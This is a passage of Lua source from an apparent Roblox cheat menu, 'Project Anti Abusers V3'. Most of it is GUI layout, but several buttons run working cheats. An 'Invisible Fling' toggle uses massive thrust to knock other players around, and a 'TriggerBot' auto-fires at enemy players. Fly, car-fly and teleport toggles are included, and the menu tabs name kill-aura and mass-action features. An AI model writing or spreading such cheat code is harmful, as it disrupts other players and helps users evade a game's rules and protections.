ProjectAntiAbusers.AntiTaze.Position = UDim2.new(0.679198027, 0, 0.419491529, 0)
ProjectAntiAbusers.AntiTaze.Size = UDim2.new(0, 122, 0, 35)
ProjectAntiAbusers.AntiTaze.Font = Enum.Font.SourceSans
ProjectAntiAbusers.AntiTaze.Text = "Anti Taze"
ProjectAntiAbusers.AntiTaze.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.AntiTaze.TextSize = 19.000

ProjectAntiAbusers.UICorner_67.Parent = ProjectAntiAbusers.AntiTaze

ProjectAntiAbusers.InvisFling.Name = "InvisFling"
ProjectAntiAbusers.InvisFling.Parent = ProjectAntiAbusers.TogglesFrame
ProjectAntiAbusers.InvisFling.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.InvisFling.BorderColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.InvisFling.Position = UDim2.new(0.353383452, 0, 0.605932236, 0)
ProjectAntiAbusers.InvisFling.Size = UDim2.new(0, 122, 0, 35)
ProjectAntiAbusers.InvisFling.Font = Enum.Font.SourceSans
ProjectAntiAbusers.InvisFling.Text = "Invisible Fling"
ProjectAntiAbusers.InvisFling.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.InvisFling.TextSize = 19.000
flinging = false
ProjectAntiAbusers.InvisFling.MouseButton1Click:connect(function()
	if flinging == false then
		flinging = true
		ProjectAntiAbusers.InvisFling.TextColor3 = Color3.new(0,255,0)
	else
		flinging = false
		ProjectAntiAbusers.InvisFling.TextColor3 = Color3.new(255,0,0)
	end
	wait(.1)
	if flinging == true then
		local ch = game.Players.LocalPlayer.Character
	local prt=Instance.new("Model", game.Players.LocalPlayer.Character)
	local z1 = Instance.new("Part")
	z1.Name="Torso"
	z1.CanCollide = false
	z1.Anchored = true
	local z2 = Instance.new("Part", prt)
	z2.Name="Head"
	z2.Anchored = true
	z2.CanCollide = false
	local z3 =Instance.new("Humanoid", prt)
	z3.Name="Humanoid"
	z1.Position = Vector3.new(0,9999,0)
	game.Players.LocalPlayer.Character=prt
	wait(3)
	game.Players.LocalPlayer.Character=ch
	wait(3)
	local plr = game.Players.LocalPlayer
	cmdm = plr:GetMouse()
	local Hum = Instance.new("Humanoid")
	z2:Clone()
	Hum.Parent = game.Players.LocalPlayer.Character
	local root =  game.Players.LocalPlayer.Character.HumanoidRootPart
	for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
		if v ~= root and  v.Name ~= "Humanoid" then
			v:Destroy()
		end
	end
	root.Transparency = 0
	root.Material = "ForceField"
	root.Color = Color3.new(1, 1, 1)
	game:GetService('RunService').Stepped:connect(function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
	end)
	game:GetService('RunService').RenderStepped:connect(function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
	end)
	sFLY()
	workspace.CurrentCamera.CameraSubject = root
	PF = 99999
	PF = PF*10
	local bambam = Instance.new("BodyThrust")
	bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
	bambam.Force = Vector3.new(PF,0,PF)
	bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
else
	for i,player in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
		if player.ClassName == "Part" then
			player.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
		end
	end
	FLYING = false
	game.Players.LocalPlayer.Character.HumanoidRootPart.BodyThrust:Destroy()
	game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true
	game.Players.LocalPlayer.Character.Humanoid.Sit = true
	wait(0.1)
	game.Players.LocalPlayer.Character.Humanoid.Jump = true
end
end)

ProjectAntiAbusers.UICorner_68.Parent = ProjectAntiAbusers.InvisFling

ProjectAntiAbusers.Fly.Name = "Fly"
ProjectAntiAbusers.Fly.Parent = ProjectAntiAbusers.TogglesFrame
ProjectAntiAbusers.Fly.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.Fly.BorderColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.Fly.Position = UDim2.new(0.679198027, 0, 0.605932236, 0)
ProjectAntiAbusers.Fly.Size = UDim2.new(0, 122, 0, 35)
ProjectAntiAbusers.Fly.Font = Enum.Font.SourceSans
ProjectAntiAbusers.Fly.Text = "Fly"
ProjectAntiAbusers.Fly.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.Fly.TextSize = 19.000
fly = false
ProjectAntiAbusers.Fly.MouseButton1Click:connect(function()
	if fly == false then
		fly = true
		ProjectAntiAbusers.Fly.TextColor3 = Color3.new(0,255,0)
	else
		fly = false
		ProjectAntiAbusers.Fly.TextColor3 = Color3.new(255,0,0)
	end
	if fly == false then
	FLYING = false
	game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
	wait()
	sFLY()
	speedofthefly = 1
	else
		FLYING = false
	game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
end
end)

ProjectAntiAbusers.UICorner_69.Parent = ProjectAntiAbusers.Fly

ProjectAntiAbusers.CarFly.Name = "CarFly"
ProjectAntiAbusers.CarFly.Parent = ProjectAntiAbusers.TogglesFrame
ProjectAntiAbusers.CarFly.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.CarFly.BorderColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.CarFly.Position = UDim2.new(0.353383452, 0, 0.792372942, 0)
ProjectAntiAbusers.CarFly.Size = UDim2.new(0, 122, 0, 35)
ProjectAntiAbusers.CarFly.Font = Enum.Font.SourceSans
ProjectAntiAbusers.CarFly.Text = "Car Fly"
ProjectAntiAbusers.CarFly.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.CarFly.TextSize = 19.000
carfly = false
ProjectAntiAbusers.CarFly.MouseButton1Click:connect(function()
if carfly == false then
	carfly = true
	ProjectAntiAbusers.CarFly.TextColor3 = Color3.new(0,255,0)
else
	carfly = false
	ProjectAntiAbusers.CarFly.TextColor3 = Color3.new(255,0,0)
end
if carfly == true then
	FLYING = false
	game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
	wait()
	sFLY(true)
	speedofthevfly = 1
else
FLYING = false
game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
end
end)

ProjectAntiAbusers.UICorner_70.Parent = ProjectAntiAbusers.CarFly

ProjectAntiAbusers.ESP.Name = "ESP"
ProjectAntiAbusers.ESP.Parent = ProjectAntiAbusers.TogglesFrame
ProjectAntiAbusers.ESP.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.ESP.BorderColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.ESP.Position = UDim2.new(0.679198027, 0, 0.80084753, 0)
ProjectAntiAbusers.ESP.Size = UDim2.new(0, 122, 0, 35)
ProjectAntiAbusers.ESP.Font = Enum.Font.SourceSans
ProjectAntiAbusers.ESP.Text = "TriggerBot"
ProjectAntiAbusers.ESP.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.ESP.TextSize = 19.000
triggerbot = false
ProjectAntiAbusers.ESP.MouseButton1Click:connect(function()
if triggerbot == false then
	triggerbot = true
	ProjectAntiAbusers.ESP.TextColor3 = Color3.new(0,255,0)
else
	triggerbot = false
	ProjectAntiAbusers.ESP.TextColor3 = Color3.new(255,0,0)
end
local plr = game.Players.LocalPlayer
local mouse = plr:GetMouse()
mouse.Move:connect(function()
    if mouse.Target then
        if mouse.Target.Parent == "Part" then end
        local plr = game.Players:GetPlayerFromCharacter(mouse.Target.Parent)
        if not plr then return nil
    end
        if plr.TeamColor ~= game.Players.LocalPlayer.TeamColor then
            if plr.Character.Humanoid.Health ~= 0 then
                if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
                    if triggerbot then
            mouse1click()
                    end
                end
            end
        end
    end
end)
end)

ProjectAntiAbusers.UICorner_71.Parent = ProjectAntiAbusers.ESP

ProjectAntiAbusers.TopBar.Name = "TopBar"
ProjectAntiAbusers.TopBar.Parent = ProjectAntiAbusers.Background
ProjectAntiAbusers.TopBar.BackgroundColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.TopBar.Position = UDim2.new(0, 0, 0.000780076254, 0)
ProjectAntiAbusers.TopBar.Size = UDim2.new(0, 512, 0, 19)

ProjectAntiAbusers.UICorner_72.Parent = ProjectAntiAbusers.TopBar

ProjectAntiAbusers.DiscordButton.Name = "DiscordButton"
ProjectAntiAbusers.DiscordButton.Parent = ProjectAntiAbusers.TopBar
ProjectAntiAbusers.DiscordButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.DiscordButton.BackgroundTransparency = 1.000
ProjectAntiAbusers.DiscordButton.Position = UDim2.new(0.822265625, 0, 0, 0)
ProjectAntiAbusers.DiscordButton.Size = UDim2.new(0, 90, 0, 19)
ProjectAntiAbusers.DiscordButton.Font = Enum.Font.SciFi
ProjectAntiAbusers.DiscordButton.Text = "Discord"
ProjectAntiAbusers.DiscordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.DiscordButton.TextSize = 17.000
ProjectAntiAbusers.DiscordButton.MouseButton1Click:connect(function()
setclipboard('discord.gg/CWSsGEm')
end)

ProjectAntiAbusers.TitleVersion.Name = "TitleVersion"
ProjectAntiAbusers.TitleVersion.Parent = ProjectAntiAbusers.TopBar
ProjectAntiAbusers.TitleVersion.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TitleVersion.BackgroundTransparency = 1.000
ProjectAntiAbusers.TitleVersion.Position = UDim2.new(0.31640625, 0, 0, 0)
ProjectAntiAbusers.TitleVersion.Size = UDim2.new(0, 200, 0, 19)
ProjectAntiAbusers.TitleVersion.Font = Enum.Font.SciFi
ProjectAntiAbusers.TitleVersion.Text = "Project Anti Abusers V3 "
ProjectAntiAbusers.TitleVersion.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TitleVersion.TextSize = 16.000

ProjectAntiAbusers.TpStuffFrame.Name = "TpStuffFrame"
ProjectAntiAbusers.TpStuffFrame.Parent = ProjectAntiAbusers.Background
ProjectAntiAbusers.TpStuffFrame.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.TpStuffFrame.Position = UDim2.new(0.217046857, 0, 0.0908461213, 0)
ProjectAntiAbusers.TpStuffFrame.Size = UDim2.new(0, 399, 0, 236)
ProjectAntiAbusers.TpStuffFrame.Visible = false

ProjectAntiAbusers.UICorner_73.Parent = ProjectAntiAbusers.TpStuffFrame

ProjectAntiAbusers.BorderTp.Name = "BorderTp"
ProjectAntiAbusers.BorderTp.Parent = ProjectAntiAbusers.TpStuffFrame
ProjectAntiAbusers.BorderTp.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.BorderTp.Position = UDim2.new(0.0300751869, 0, 0.0423728824, 0)
ProjectAntiAbusers.BorderTp.Size = UDim2.new(0, 186, 0, 39)
ProjectAntiAbusers.BorderTp.Font = Enum.Font.SourceSans
ProjectAntiAbusers.BorderTp.Text = "Border"
ProjectAntiAbusers.BorderTp.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.BorderTp.TextSize = 21.000

ProjectAntiAbusers.UICorner_74.Parent = ProjectAntiAbusers.BorderTp

ProjectAntiAbusers.NexusTp.Name = "NexusTp"
ProjectAntiAbusers.NexusTp.Parent = ProjectAntiAbusers.TpStuffFrame
ProjectAntiAbusers.NexusTp.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.NexusTp.Position = UDim2.new(0.0300751869, 0, 0.224576265, 0)
ProjectAntiAbusers.NexusTp.Size = UDim2.new(0, 186, 0, 39)
ProjectAntiAbusers.NexusTp.Font = Enum.Font.SourceSans
ProjectAntiAbusers.NexusTp.Text = "Nexus"
ProjectAntiAbusers.NexusTp.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.NexusTp.TextSize = 21.000

ProjectAntiAbusers.UICorner_75.Parent = ProjectAntiAbusers.NexusTp

ProjectAntiAbusers.BridgeBaseTp.Name = "BridgeBaseTp"
ProjectAntiAbusers.BridgeBaseTp.Parent = ProjectAntiAbusers.TpStuffFrame
ProjectAntiAbusers.BridgeBaseTp.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.BridgeBaseTp.Position = UDim2.new(0.0300751869, 0, 0.415254235, 0)
ProjectAntiAbusers.BridgeBaseTp.Size = UDim2.new(0, 186, 0, 39)
ProjectAntiAbusers.BridgeBaseTp.Font = Enum.Font.SourceSans
ProjectAntiAbusers.BridgeBaseTp.Text = "Bridge Base"
ProjectAntiAbusers.BridgeBaseTp.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.BridgeBaseTp.TextSize = 21.000

ProjectAntiAbusers.UICorner_76.Parent = ProjectAntiAbusers.BridgeBaseTp

ProjectAntiAbusers.CriminalBaseTp.Name = "CriminalBaseTp"
ProjectAntiAbusers.CriminalBaseTp.Parent = ProjectAntiAbusers.TpStuffFrame
ProjectAntiAbusers.CriminalBaseTp.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.CriminalBaseTp.Position = UDim2.new(0.0300751869, 0, 0.601694942, 0)
ProjectAntiAbusers.CriminalBaseTp.Size = UDim2.new(0, 186, 0, 39)
ProjectAntiAbusers.CriminalBaseTp.Font = Enum.Font.SourceSans
ProjectAntiAbusers.CriminalBaseTp.Text = "Criminal Base"
ProjectAntiAbusers.CriminalBaseTp.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.CriminalBaseTp.TextSize = 21.000

ProjectAntiAbusers.UICorner_77.Parent = ProjectAntiAbusers.CriminalBaseTp

ProjectAntiAbusers.SecretRoomTp.Name = "SecretRoomTp"
ProjectAntiAbusers.SecretRoomTp.Parent = ProjectAntiAbusers.TpStuffFrame
ProjectAntiAbusers.SecretRoomTp.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.SecretRoomTp.Position = UDim2.new(0.0275689214, 0, 0.792372882, 0)
ProjectAntiAbusers.SecretRoomTp.Size = UDim2.new(0, 186, 0, 39)
ProjectAntiAbusers.SecretRoomTp.Font = Enum.Font.SourceSans
ProjectAntiAbusers.SecretRoomTp.Text = "Secret Room"
ProjectAntiAbusers.SecretRoomTp.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.SecretRoomTp.TextSize = 21.000

ProjectAntiAbusers.UICorner_78.Parent = ProjectAntiAbusers.SecretRoomTp

ProjectAntiAbusers.RoofTp.Name = "RoofTp"
ProjectAntiAbusers.RoofTp.Parent = ProjectAntiAbusers.TpStuffFrame
ProjectAntiAbusers.RoofTp.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.RoofTp.Position = UDim2.new(0.521303236, 0, 0.0423728824, 0)
ProjectAntiAbusers.RoofTp.Size = UDim2.new(0, 186, 0, 39)
ProjectAntiAbusers.RoofTp.Font = Enum.Font.SourceSans
ProjectAntiAbusers.RoofTp.Text = "Roof"
ProjectAntiAbusers.RoofTp.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.RoofTp.TextSize = 21.000

ProjectAntiAbusers.UICorner_79.Parent = ProjectAntiAbusers.RoofTp

ProjectAntiAbusers.Sewers.Name = "Sewers"
ProjectAntiAbusers.Sewers.Parent = ProjectAntiAbusers.TpStuffFrame
ProjectAntiAbusers.Sewers.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.Sewers.Position = UDim2.new(0.521303236, 0, 0.224576265, 0)
ProjectAntiAbusers.Sewers.Size = UDim2.new(0, 186, 0, 39)
ProjectAntiAbusers.Sewers.Font = Enum.Font.SourceSans
ProjectAntiAbusers.Sewers.Text = "Sewers"
ProjectAntiAbusers.Sewers.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.Sewers.TextSize = 21.000

ProjectAntiAbusers.UICorner_80.Parent = ProjectAntiAbusers.Sewers

ProjectAntiAbusers.CellsTp.Name = "CellsTp"
ProjectAntiAbusers.CellsTp.Parent = ProjectAntiAbusers.TpStuffFrame
ProjectAntiAbusers.CellsTp.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.CellsTp.Position = UDim2.new(0.521303236, 0, 0.415254235, 0)
ProjectAntiAbusers.CellsTp.Size = UDim2.new(0, 186, 0, 39)
ProjectAntiAbusers.CellsTp.Font = Enum.Font.SourceSans
ProjectAntiAbusers.CellsTp.Text = "Cells"
ProjectAntiAbusers.CellsTp.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.CellsTp.TextSize = 21.000

ProjectAntiAbusers.UICorner_81.Parent = ProjectAntiAbusers.CellsTp

ProjectAntiAbusers.UnusedAreaTp.Name = "UnusedAreaTp"
ProjectAntiAbusers.UnusedAreaTp.Parent = ProjectAntiAbusers.TpStuffFrame
ProjectAntiAbusers.UnusedAreaTp.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.UnusedAreaTp.Position = UDim2.new(0.521303236, 0, 0.601694942, 0)
ProjectAntiAbusers.UnusedAreaTp.Size = UDim2.new(0, 186, 0, 39)
ProjectAntiAbusers.UnusedAreaTp.Font = Enum.Font.SourceSans
ProjectAntiAbusers.UnusedAreaTp.Text = "Unused Area"
ProjectAntiAbusers.UnusedAreaTp.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.UnusedAreaTp.TextSize = 21.000
ProjectAntiAbusers.UnusedAreaTp.MouseButton1Click:connect(function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1070.88562, 97.9999466, 2359.35962, -0.000125032151, -6.38857278e-09, 1.00000036, 3.98193514e-08, 1, 6.39351905e-09, -1.00000036, 3.98201578e-08, -0.000125032151)
end)

ProjectAntiAbusers.UICorner_82.Parent = ProjectAntiAbusers.UnusedAreaTp

ProjectAntiAbusers.WallTp.Name = "WallTp"
ProjectAntiAbusers.WallTp.Parent = ProjectAntiAbusers.TpStuffFrame
ProjectAntiAbusers.WallTp.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.WallTp.Position = UDim2.new(0.521303236, 0, 0.792372942, 0)
ProjectAntiAbusers.WallTp.Size = UDim2.new(0, 186, 0, 39)
ProjectAntiAbusers.WallTp.Font = Enum.Font.SourceSans
ProjectAntiAbusers.WallTp.Text = "Wall"
ProjectAntiAbusers.WallTp.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.WallTp.TextSize = 21.000

ProjectAntiAbusers.UICorner_83.Parent = ProjectAntiAbusers.WallTp

ProjectAntiAbusers.formakingthescrollingtabnicerdonotremoveomg.Name = "formakingthescrollingtabnicerdonotremoveomg"
ProjectAntiAbusers.formakingthescrollingtabnicerdonotremoveomg.Parent = ProjectAntiAbusers.Background
ProjectAntiAbusers.formakingthescrollingtabnicerdonotremoveomg.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.formakingthescrollingtabnicerdonotremoveomg.Position = UDim2.new(0.01171875, 0, 0.0546262302, 0)
ProjectAntiAbusers.formakingthescrollingtabnicerdonotremoveomg.Size = UDim2.new(0, 100, 0, 245)

ProjectAntiAbusers.UICorner_84.Parent = ProjectAntiAbusers.formakingthescrollingtabnicerdonotremoveomg

ProjectAntiAbusers.ScrollingTabs.Name = "ScrollingTabs"
ProjectAntiAbusers.ScrollingTabs.Parent = ProjectAntiAbusers.formakingthescrollingtabnicerdonotremoveomg
ProjectAntiAbusers.ScrollingTabs.Active = true
ProjectAntiAbusers.ScrollingTabs.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.ScrollingTabs.BorderSizePixel = 0
ProjectAntiAbusers.ScrollingTabs.Position = UDim2.new(0, 0, 0.0243400726, 0)
ProjectAntiAbusers.ScrollingTabs.Size = UDim2.new(0, 99, 0, 229)
ProjectAntiAbusers.ScrollingTabs.ScrollBarThickness = 5

ProjectAntiAbusers.MusicFeedback.Name = "MusicFeedback"
ProjectAntiAbusers.MusicFeedback.Parent = ProjectAntiAbusers.ScrollingTabs
ProjectAntiAbusers.MusicFeedback.BackgroundColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.MusicFeedback.Position = UDim2.new(0, 0, 0.00487179914, 0)
ProjectAntiAbusers.MusicFeedback.Size = UDim2.new(0, 89, 0, 26)
ProjectAntiAbusers.MusicFeedback.Font = Enum.Font.SourceSans
ProjectAntiAbusers.MusicFeedback.Text = "Music & feedback"
ProjectAntiAbusers.MusicFeedback.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.MusicFeedback.TextSize = 14.000

ProjectAntiAbusers.UICorner_85.Parent = ProjectAntiAbusers.MusicFeedback

ProjectAntiAbusers.LocalFunctions.Name = "LocalFunctions"
ProjectAntiAbusers.LocalFunctions.Parent = ProjectAntiAbusers.ScrollingTabs
ProjectAntiAbusers.LocalFunctions.BackgroundColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.LocalFunctions.Position = UDim2.new(0, 0, 0.0664102584, 0)
ProjectAntiAbusers.LocalFunctions.Size = UDim2.new(0, 89, 0, 26)
ProjectAntiAbusers.LocalFunctions.Font = Enum.Font.SourceSans
ProjectAntiAbusers.LocalFunctions.Text = "Local Functions"
ProjectAntiAbusers.LocalFunctions.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.LocalFunctions.TextSize = 14.000

ProjectAntiAbusers.UICorner_86.Parent = ProjectAntiAbusers.LocalFunctions

ProjectAntiAbusers.BringStuff.Name = "Bring Stuff"
ProjectAntiAbusers.BringStuff.Parent = ProjectAntiAbusers.ScrollingTabs
ProjectAntiAbusers.BringStuff.BackgroundColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.BringStuff.Position = UDim2.new(0, 0, 0.13179487, 0)
ProjectAntiAbusers.BringStuff.Size = UDim2.new(0, 89, 0, 26)
ProjectAntiAbusers.BringStuff.Font = Enum.Font.SourceSans
ProjectAntiAbusers.BringStuff.Text = "Bring Stuff"
ProjectAntiAbusers.BringStuff.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.BringStuff.TextSize = 14.000

ProjectAntiAbusers.UICorner_87.Parent = ProjectAntiAbusers.BringStuff

ProjectAntiAbusers.MiscFunctions.Name = "MiscFunctions"
ProjectAntiAbusers.MiscFunctions.Parent = ProjectAntiAbusers.ScrollingTabs
ProjectAntiAbusers.MiscFunctions.BackgroundColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.MiscFunctions.Position = UDim2.new(0, 0, 0.199102566, 0)
ProjectAntiAbusers.MiscFunctions.Size = UDim2.new(0, 89, 0, 26)
ProjectAntiAbusers.MiscFunctions.Font = Enum.Font.SourceSans
ProjectAntiAbusers.MiscFunctions.Text = "Misc Functions"
ProjectAntiAbusers.MiscFunctions.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.MiscFunctions.TextSize = 14.000

ProjectAntiAbusers.UICorner_88.Parent = ProjectAntiAbusers.MiscFunctions

ProjectAntiAbusers.GunStuff.Name = "GunStuff"
ProjectAntiAbusers.GunStuff.Parent = ProjectAntiAbusers.ScrollingTabs
ProjectAntiAbusers.GunStuff.BackgroundColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.GunStuff.Position = UDim2.new(0, 0, 0.264487177, 0)
ProjectAntiAbusers.GunStuff.Size = UDim2.new(0, 89, 0, 26)
ProjectAntiAbusers.GunStuff.Font = Enum.Font.SourceSans
ProjectAntiAbusers.GunStuff.Text = "Gun Stuff"
ProjectAntiAbusers.GunStuff.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.GunStuff.TextSize = 14.000

ProjectAntiAbusers.UICorner_89.Parent = ProjectAntiAbusers.GunStuff

ProjectAntiAbusers.MassButton.Name = "MassButton"
ProjectAntiAbusers.MassButton.Parent = ProjectAntiAbusers.ScrollingTabs
ProjectAntiAbusers.MassButton.BackgroundColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.MassButton.Position = UDim2.new(0, 0, 0.326025635, 0)
ProjectAntiAbusers.MassButton.Size = UDim2.new(0, 89, 0, 26)
ProjectAntiAbusers.MassButton.Font = Enum.Font.SourceSans
ProjectAntiAbusers.MassButton.Text = "Mass Buttons"
ProjectAntiAbusers.MassButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.MassButton.TextSize = 14.000

ProjectAntiAbusers.UICorner_90.Parent = ProjectAntiAbusers.MassButton

ProjectAntiAbusers.TpStuff.Name = "TpStuff"
ProjectAntiAbusers.TpStuff.Parent = ProjectAntiAbusers.ScrollingTabs
ProjectAntiAbusers.TpStuff.BackgroundColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.TpStuff.Position = UDim2.new(0, 0, 0.387564093, 0)
ProjectAntiAbusers.TpStuff.Size = UDim2.new(0, 89, 0, 26)
ProjectAntiAbusers.TpStuff.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TpStuff.Text = "Teleport Stuff"
ProjectAntiAbusers.TpStuff.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TpStuff.TextSize = 14.000

ProjectAntiAbusers.UICorner_91.Parent = ProjectAntiAbusers.TpStuff

ProjectAntiAbusers.GlobalButtons.Name = "GlobalButtons"
ProjectAntiAbusers.GlobalButtons.Parent = ProjectAntiAbusers.ScrollingTabs
ProjectAntiAbusers.GlobalButtons.BackgroundColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.GlobalButtons.Position = UDim2.new(0, 0, 0.452948719, 0)
ProjectAntiAbusers.GlobalButtons.Size = UDim2.new(0, 89, 0, 26)
ProjectAntiAbusers.GlobalButtons.Font = Enum.Font.SourceSans
ProjectAntiAbusers.GlobalButtons.Text = "Global Buttons"
ProjectAntiAbusers.GlobalButtons.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.GlobalButtons.TextSize = 14.000

ProjectAntiAbusers.UICorner_92.Parent = ProjectAntiAbusers.GlobalButtons

ProjectAntiAbusers.TeamStuff.Name = "TeamStuff"
ProjectAntiAbusers.TeamStuff.Parent = ProjectAntiAbusers.ScrollingTabs
ProjectAntiAbusers.TeamStuff.BackgroundColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.TeamStuff.Position = UDim2.new(0, 0, 0.516410232, 0)
ProjectAntiAbusers.TeamStuff.Size = UDim2.new(0, 89, 0, 26)
ProjectAntiAbusers.TeamStuff.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TeamStuff.Text = "Team Stuff"
ProjectAntiAbusers.TeamStuff.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TeamStuff.TextSize = 14.000

ProjectAntiAbusers.UICorner_93.Parent = ProjectAntiAbusers.TeamStuff

ProjectAntiAbusers.Toggles.Name = "Toggles"
ProjectAntiAbusers.Toggles.Parent = ProjectAntiAbusers.ScrollingTabs
ProjectAntiAbusers.Toggles.BackgroundColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.Toggles.Position = UDim2.new(0, 0, 0.583717942, 0)
ProjectAntiAbusers.Toggles.Size = UDim2.new(0, 89, 0, 26)
ProjectAntiAbusers.Toggles.Font = Enum.Font.SourceSans
ProjectAntiAbusers.Toggles.Text = "Toggles"
ProjectAntiAbusers.Toggles.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.Toggles.TextSize = 14.000

ProjectAntiAbusers.UICorner_94.Parent = ProjectAntiAbusers.Toggles

ProjectAntiAbusers.OtherGUIs.Name = "OtherGUIs"
ProjectAntiAbusers.OtherGUIs.Parent = ProjectAntiAbusers.ScrollingTabs
ProjectAntiAbusers.OtherGUIs.BackgroundColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.OtherGUIs.Position = UDim2.new(0, 0, 0.714487195, 0)
ProjectAntiAbusers.OtherGUIs.Size = UDim2.new(0, 89, 0, 26)
ProjectAntiAbusers.OtherGUIs.Font = Enum.Font.SourceSans
ProjectAntiAbusers.OtherGUIs.Text = "Other GUIs"
ProjectAntiAbusers.OtherGUIs.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.OtherGUIs.TextSize = 14.000

ProjectAntiAbusers.UICorner_95.Parent = ProjectAntiAbusers.OtherGUIs

ProjectAntiAbusers.KillAuraStuff.Name = "KillAuraStuff"
ProjectAntiAbusers.KillAuraStuff.Parent = ProjectAntiAbusers.ScrollingTabs
ProjectAntiAbusers.KillAuraStuff.BackgroundColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.KillAuraStuff.Position = UDim2.new(0, 0, 0.777948737, 0)
ProjectAntiAbusers.KillAuraStuff.Size = UDim2.new(0, 89, 0, 26)
ProjectAntiAbusers.KillAuraStuff.Font = Enum.Font.SourceSans
ProjectAntiAbusers.KillAuraStuff.Text = "Kill Aura Toggles"
ProjectAntiAbusers.KillAuraStuff.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.KillAuraStuff.TextSize = 14.000

ProjectAntiAbusers.UICorner_96.Parent = ProjectAntiAbusers.KillAuraStuff

ProjectAntiAbusers.Keybinds.Name = "Keybinds"
ProjectAntiAbusers.Keybinds.Parent = ProjectAntiAbusers.ScrollingTabs
